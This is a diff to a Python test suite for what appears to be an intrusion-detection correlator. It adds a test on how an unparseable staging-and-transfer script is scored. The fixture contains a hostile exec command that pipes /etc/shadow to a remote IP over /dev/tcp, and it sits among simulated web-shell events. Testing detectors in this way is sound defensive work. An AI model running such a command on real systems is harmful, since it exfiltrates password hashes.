@@ -710,6 +710,16 @@ def test_unparseable_shell_c_script_counts_as_partial():
     assert cell["detail"]["missing_required"] >= 1 and cell["state"] != "no_match_complete"
 
 
+def test_the_final_pass_counts_an_unparseable_script_as_partial_coverage():
+    repo = _repo()
+    _seed_anchor(repo, "h1", "F-A", "host.web_shell", [exec_event("fa", ["/bin/sh"], process__pid=9)])
+    _seed_link(repo, "h1", "L-A", "F-A", [exec_event("b", ["bash", "-c", "cat /etc/shadow > /dev/tcp/1.2.3.4/80 2>&1"],
+                                                     executable="/bin/bash")])
+    finalize_context(repo, "h1")
+    cell = _cell(repo, "context.staging_and_transfer")
+    assert cell["detail"]["missing_required"] >= 1 and cell["state"].endswith("_partial")
+
+
 def test_staging_inbound_devtcp_is_ingress_not_transfer():
     inbound = exec_event("i", ["bash", "-c", "cat < /dev/tcp/10.0.0.9/80"], executable="/bin/bash")
     match = one(StagingAndTransfer, [inbound])[0]
